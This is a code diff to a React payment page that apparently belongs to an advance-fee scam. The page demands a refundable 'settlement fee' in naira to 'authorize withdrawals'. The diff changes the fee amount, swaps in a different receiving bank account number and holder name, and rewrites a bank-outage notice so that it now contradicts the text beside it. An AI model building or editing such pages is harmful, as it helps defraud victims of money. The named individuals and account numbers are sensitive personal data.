@@ -79,14 +79,14 @@ const PaymentDetails: React.FC = () => {
                 <path d="M16 24C16 19.5817 19.5817 16 24 16C28.4183 16 32 19.5817 32 24" stroke="#10B981" strokeWidth="4" strokeLinecap="round"/>
               </svg>
             </div>
-            <DialogTitle className="text-xl text-red-500 font-bold">Opay Service Down</DialogTitle>
+            <DialogTitle className="text-xl text-red-500 font-bold">Opay and all others supported banks are working perfectly.</DialogTitle>
             <DialogDescription className="text-gray-600 mt-2">
               Please do not use Opay bank for payments at this time.
             </DialogDescription>
             
             <div className="bg-red-50 border border-red-200 rounded-md p-4 mt-4 mb-4 w-full">
               <p className="text-red-600 text-sm">
-                The Opay bank service is currently experiencing issues. Please use other supported banks for your payment.
+                All banking banks including opay are now fully operational and available for your payment..
               </p>
             </div>
             
@@ -103,7 +103,7 @@ const PaymentDetails: React.FC = () => {
       {showConfirmation && <PaymentConfirmation />}
       <div className="w-full max-w-md bg-white rounded-lg p-6 shadow-lg">
         <h2 className="text-2xl font-bold mb-2">Make Payment to Complete Activation</h2>
-        <p className="text-gray-500 mb-6">Please make a payment of 20,000 naira to complete your activation</p>
+        <p className="text-gray-500 mb-6">Please make a payment of 15,000 naira to complete your activation</p>
         
         <div className="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
           <div className="flex items-start">
@@ -115,7 +115,7 @@ const PaymentDetails: React.FC = () => {
               </svg>
             </div>
             <p className="ml-3 text-blue-700">
-              A settlement fee of NGN 20,000.00 is required to authorize withdrawals. This fee will be credited back with your withdrawal once authorized.
+              A settlement fee of NGN 15,000.00 is required to authorize withdrawals. This fee will be credited back with your withdrawal once authorized.
             </p>
           </div>
           <div className="mt-2 text-right">
@@ -133,9 +133,9 @@ const PaymentDetails: React.FC = () => {
           <div>
             <label className="block text-sm font-medium mb-1">Account Number</label>
             <div className="flex">
-              <Input value="5051223267" readOnly className="bg-gray-50" />
+              <Input value="6243144595" readOnly className="bg-gray-50" />
               <Button variant="outline" className="ml-2 px-2" onClick={() => {
-                navigator.clipboard.writeText("5051223267");
+                navigator.clipboard.writeText("6243144595");
                 toast.success("Account number copied to clipboard");
               }}>
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -153,7 +153,7 @@ const PaymentDetails: React.FC = () => {
           
           <div>
             <label className="block text-sm font-medium mb-1">Account Name</label>
-            <Input value="GLADNESS CHIGOZIE PIUS" readOnly className="bg-gray-50" />
+            <Input value="MATHEW EMMANUEL " readOnly className="bg-gray-50" />
           </div>
           
           <div>
